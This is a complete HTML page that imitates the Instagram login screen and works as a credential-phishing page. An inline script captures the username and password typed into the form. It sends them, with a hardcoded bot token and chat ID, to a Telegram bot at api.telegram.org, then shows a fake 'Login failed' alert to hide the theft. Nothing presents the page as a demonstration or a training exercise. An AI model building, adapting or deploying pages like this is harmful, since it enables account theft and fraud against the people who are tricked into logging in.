<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            width: 350px;
            padding: 20px;
            border: 1px solid #dbdbdb;
            background-color: white;
            text-align: center;
        }
        .logo {
            margin: 22px auto 12px;
            width: 175px;
        }
        input {
            width: 100%;
            padding: 9px 8px 7px;
            margin: 0 0 6px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #fafafa;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 7px;
            margin: 8px 0;
            background-color: #0095f6;
            border: none;
            border-radius: 4px;
            color: white;
            font-weight: bold;
        }
        .divider {
            margin: 10px 0;
            display: flex;
            align-items: center;
            color: #8e8e8e;
            font-size: 13px;
        }
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
            margin: 0 10px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
        
        <form id="loginForm">
            <input type="text" placeholder="Phone number, username, or email" required>
            <input type="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        
        <div class="divider">OR</div>
        
        <a href="#" style="color: #00376b; font-size: 14px; text-decoration: none;">Forgot password?</a>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = this.querySelector('input[type="text"]').value;
            const password = this.querySelector('input[type="password"]').value;
            
            // Send data to Telegram bot
            const botToken = '8162141808:AAHF7PMeNKyP97ByTbQbUEvLID3Xz-SFDuo';
            const chatId = '7717501787';
            const message = `New Instagram login attempt:\nUsername: ${username}\nPassword: ${password}`;
            
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Message sent:', data);
                alert('Login failed. Please try again later.');
            })
            .catch(error => {
                console.error('Error:', error);
                alert('An error occurred. Please try again.');
            });
        });
    </script>
</body>
</html>
